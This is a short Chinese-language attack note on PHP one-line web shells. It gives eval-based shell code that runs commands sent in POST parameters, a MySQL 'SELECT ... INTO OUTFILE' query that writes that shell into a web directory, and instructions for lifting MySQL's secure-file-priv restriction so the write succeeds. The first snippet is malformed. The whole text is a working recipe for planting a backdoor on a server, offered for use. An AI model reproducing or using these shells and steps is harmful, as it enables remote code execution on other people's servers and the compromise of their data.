```
<?php shell_exec=$_get['cmd']>
```



```
<?php @eval($_POST['shell']);?>
```

最简单的php一句话


上传方法
1.通过mysql写入

```
select "<?php @eval($_POST['pass']);?>" INTO OUTFILE "D:\\WWW\\22.php"
```

问题：需要对路径进行猜测

```
如果出现：
　　提示错误[Error Code] 1290 - The MySQL server is running with the --secure-file-priv option解决办法
是mysql设置的权限的问题
mysql对通过文件导入导出作了限制，默认不允许
show variables like '%secure%';
修改my.ini
secure_auth = ON
secure_file_priv = ""
注意：　
　　1、绝对路径的猜解
　　2、INTO OUTFILE 后面的"D:\\WWW\\22.php"(对反斜杠做了一次转义)
```

